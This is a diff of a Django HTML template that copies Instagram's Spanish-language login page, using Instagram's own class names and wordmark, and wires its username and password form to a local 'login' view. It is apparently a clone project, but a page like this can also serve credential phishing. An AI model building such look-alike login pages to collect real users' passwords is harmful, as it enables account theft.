@@ -18,7 +18,8 @@
           <div class="_f9sjj">
             <h1 class="_68swa _8scx2 coreSpriteLoggedOutWordmark">Instagram</h1>
             <div class="_7g6uj">
-              <form class="_asaim">
+              <form class="_asaim" action="{% url 'login' %}" method="post">
+                {% csrf_token %}
                 <h2 class="_mb54c">Inicia Sesión</h2>
                 <div class="_fhskl">
                   <div class="_j5suk">
@@ -29,21 +30,21 @@
                 </div>
                 <div class="_agqzm">
                   <div class="_sjplo">
-                    <input type="text" class="_ph6vk _o716c" aria-describedby="" aria-label="Nombre de usuario" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="30" name="username" placeholder="Nombre de usuario" value="">
+                    <input type="text" class="_ph6vk _o716c"autocapitalize="off" autocorrect="off" maxlength="30" name="username" placeholder="Nombre de usuario" value="">
                     <div class="_gaby6">
                     </div>
                   </div>
                 </div>
                 <div class="_agqzm">
                   <div class="_sjplo">
-                    <input type="password" class="_ph6vk _o716c" aria-describedby="" aria-label="Contraseña" aria-required="true" autocapitalize="off" autocorrect="off" name="password" placeholder="Contraseña" value="">
+                    <input type="password" class="_ph6vk _o716c "aria-label="Contraseña" name="password" placeholder="Contraseña" value="">
                     <div class="_gaby6">
                     </div>
                   </div>
                 </div>
                 <div>
                   <span class="_9mno0 _ov9ai">
-                    <button class="_qv64e_gexxb_4tgw8_njrw0">Entrar</button>
+                    <button class="_qv64e_gexxb_4tgw8_njrw0" type="submit">Entrar</button>
                   </span>
                 </div>
               </form>
